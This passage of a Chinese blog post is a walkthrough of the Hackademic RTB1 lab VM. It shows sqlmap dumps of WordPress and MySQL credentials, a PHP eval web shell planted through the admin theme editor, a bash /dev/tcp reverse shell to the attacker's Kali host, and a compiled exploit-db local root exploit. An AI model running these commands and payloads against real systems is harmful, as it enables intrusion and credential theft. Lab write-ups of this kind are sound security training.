+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.33.128/Hackademic_RTB1/?cat=1&quot; -D wordpress --tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112105852983.png" alt="image-20240112105852983"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-------------------+</span><br><span class="line">| wp_categories     |</span><br><span class="line">| wp_comments       |</span><br><span class="line">| wp_linkcategories |</span><br><span class="line">| wp_links          |</span><br><span class="line">| wp_options        |</span><br><span class="line">| wp_post2cat       |</span><br><span class="line">| wp_postmeta       |</span><br><span class="line">| wp_posts          |</span><br><span class="line">| wp_users          |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.33.128/Hackademic_RTB1/?cat=1&quot; -D mysql --tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112111954540.png" alt="image-20240112111954540"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.33.128/Hackademic_RTB1/?cat=1&quot; -D mysql -T user --column</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112112123088.png" alt="image-20240112112123088"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.33.128/Hackademic_RTB1/?cat=1&quot; --batch -D wordpress -T wp_users --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112145530249.png" alt="image-20240112145530249"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.33.128/Hackademic_RTB1/?cat=1&quot; --batch -D wordpress -T wp_users -C &quot;ID,user_pass,user_email,user_level,user_login&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112145903618.png" alt="image-20240112145903618"></p>
+<p>GeorgeMiller权限为10，权限最大</p>
+<h5 id="登陆网页"><a href="#登陆网页" class="headerlink" title="登陆网页"></a>登陆网页</h5><p><a target="_blank" rel="noopener" href="http://192.168.33.128/Hackademic_RTB1/wp-login.php">http://192.168.33.128/Hackademic_RTB1/wp-login.php</a></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112145954774.png" alt="image-20240112145954774"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GeorgeMiller </span><br><span class="line">q1w2e3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/sdasdada.png" alt="sdasdada"></p>
+<p>成功登陆admin</p>
+<h5 id="文件上传修改"><a href="#文件上传修改" class="headerlink" title="文件上传修改"></a>文件上传修改</h5><p><a target="_blank" rel="noopener" href="http://192.168.33.128/Hackademic_RTB1/wp-admin/templates.php?file=wp-content/plugins/hello.php&a=te">http://192.168.33.128/Hackademic_RTB1/wp-admin/templates.php?file=wp-content/plugins/hello.php&amp;a=te</a></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112151048238.png" alt="image-20240112151048238"></p>
+<p>一句马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval($_POST[a]);</span><br></pre></td></tr></table></figure>
+
+<h5 id="蚁剑开shell"><a href="#蚁剑开shell" class="headerlink" title="蚁剑开shell"></a>蚁剑开shell</h5><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112152009209.png" alt="image-20240112152009209"></p>
+<p>成功</p>
+<p>用蚁剑打开服务器的终端</p>
+<p>kali监听4444端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112160401126.png" alt="image-20240112160401126"></p>
+<p>蚁剑终端输入</p>
+<p>ip为kali的ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/192.168.33.129/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112160432011.png" alt="image-20240112160432011"></p>
+<p>在kali中使用更强的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">ctrl +z </span><br><span class="line">stty raw -echo;fg;reset </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112161333145.png" alt="image-20240112161333145"></p>
+<p>查看内核版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uanme -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112161434726.png" alt="image-20240112161434726"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 athlon i386 GNU/Linux</span><br></pre></td></tr></table></figure>
+
+<p>在kali中搜索漏洞库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 2.6.3|grep local|</span><br><span class="line">searchsploit 2.6.3|grep local|grep rc8</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112161623448.png" alt="image-20240112161623448"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112161910843.png" alt="image-20240112161910843"></p>
+<p>全局搜索漏洞文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate -b 15285.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112162145297.png" alt="image-20240112162145297"></p>
+<p>复制文件到桌面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/15285.c ./</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112162847786.png" alt="image-20240112162847786"></p>
+<p>查询文件位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112163150238.png" alt="image-20240112163150238"></p>
+<p>利用蚁剑把马放到文件位置</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112163258961.png" alt="image-20240112163258961"></p>
+<p>编译改漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o exp 15285.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112163344746.png" alt="image-20240112163344746"></p>
+<p>改权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 exp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112163745913.png" alt="image-20240112163745913"></p>
+<p>运行编译文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112163831778.png" alt="image-20240112163831778"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112163853593.png" alt="image-20240112163853593"></p>
+<p>获得root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112164048162.png" alt="image-20240112164048162"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ./key*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112164143780.png" alt="image-20240112164143780"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Yeah!!</span><br><span class="line">You must be proud because you &#x27;ve got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)</span><br><span class="line"></span><br><span class="line">$_d&amp;jgQ&gt;&gt;ak\#b&quot;(Hx&quot;o&lt;la_%</span><br><span class="line"></span><br><span class="line">Regards,</span><br><span class="line">mr.pr0n || p0wnbox.Team || 2011</span><br><span class="line">http://p0wnbox.com</span><br><span class="line"></span><br><span class="line">Yeah!!</span><br><span class="line">You must be proud becouse you ve got the password to complete the First Reallistic Hackademic Challenge (Hackademic.RTB1) :)</span><br><span class="line"></span><br><span class="line">$_d&amp;jgQ&gt;&gt;ak\#b&quot;(Hx&quot;o&lt;la_%</span><br><span class="line"></span><br><span class="line">Regards,</span><br><span class="line">mr.pr0n || p0wnbox.Team || 2011</span><br><span class="line">http://p0wnbox.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">是 啊你一定很自豪，因为你已经获得了完成第一个*现实*Hackademic挑战的密码（Hackaderic.RTB1）：）$_d&amp;jgQ&gt;&gt;ak\#b“（Hx”o&lt;la_%当做mr.pr0n||p0wnbox。团队||2011http://p0wnbox.com是 啊你一定很自豪，因为你已经获得了完成第一次真实黑客挑战的密码（Hackademic.RTB1）：）$_d&amp;jgQ&gt;&gt;ak\#b“（Hx”o&lt;la_%当做mr.pr0n||p0wnbox。团队||2011http://p0wnbox.com</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="试出mysql密码"><a href="#试出mysql密码" class="headerlink" title="试出mysql密码"></a>试出mysql密码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.33.128/Hackademic_RTB1/?cat=1&quot; --batch -D mysql -T user -C &quot;Host,max_user_connections,User,Password&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112112552131.png" alt="image-20240112112552131"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line">2eaec110380126d7</span><br><span class="line">test # 解码得到</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2eaec110380126d7</span><br><span class="line">它转换为10进制后是:</span><br><span class="line"></span><br><span class="line">613736150433</span><br><span class="line"></span><br><span class="line">通过在线MD5解密网站解密,得到的明文为:</span><br><span class="line"></span><br><span class="line">test</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/01/14/13.1-%E6%89%93%E9%9D%B6/" data-id="clrcswxke0005ugwk821l8sm5" data-title="13.1-打靶" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/01/14/DB/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          DB
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/01/14/14.1-%E4%BB%A3%E7%90%86-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">14.1-代理-流量分析</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/01/14/hexo%E5%8D%9A%E5%AE%A2%E6%A0%BC%E5%BC%8F%EF%BC%88%E5%8D%9A%E5%AE%A2%E7%89%88%EF%BC%89/">markdown的使用说明</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/14/DB/">DB</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/14/13.1-%E6%89%93%E9%9D%B6/">13.1-打靶</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/14/14.1-%E4%BB%A3%E7%90%86-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">14.1-代理-流量分析</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/14/1.3-%E5%8D%9A%E5%AE%A2%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E4%B8%8A%E4%BC%A0/">1.3-博客的编写与上传</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
